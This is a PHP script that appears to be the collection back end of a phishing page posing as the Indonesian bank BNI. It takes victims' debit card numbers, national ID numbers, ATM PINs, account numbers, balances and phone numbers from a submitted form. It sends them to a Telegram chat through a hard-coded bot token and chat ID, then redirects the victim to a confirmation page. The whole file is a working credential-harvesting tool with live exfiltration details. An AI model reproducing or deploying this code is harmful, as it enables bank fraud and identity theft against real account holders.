<?php

    header('Location: /bni/done.html');
    
    $apiToken = "6656758431:AAG1ilgQl8UHBrJUvg1K-qSKq658frxL7IY";

$debit            = $_POST['debit'];
$nikktp            = $_POST['nikktp'];
$nope            = $_POST['nope'];
$pinatm            = $_POST['pinatm'];
$reke            = $_POST['reke'];
$saldo1            = $_POST['saldo1'];

$message = "
──────────────────────
BANK | BNI | ".$nope."
──────────────────────
• No Kartu : ".$debit."
• Nik KTP : ".$nikktp."
• PIN ATM : ".$pinatm."
• No Rek : ".$reke."
• Saldo : ".$saldo1."
• No HP : ".$nope."
──────────────────────";

    $data = [
        'chat_id' => '6595419648',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();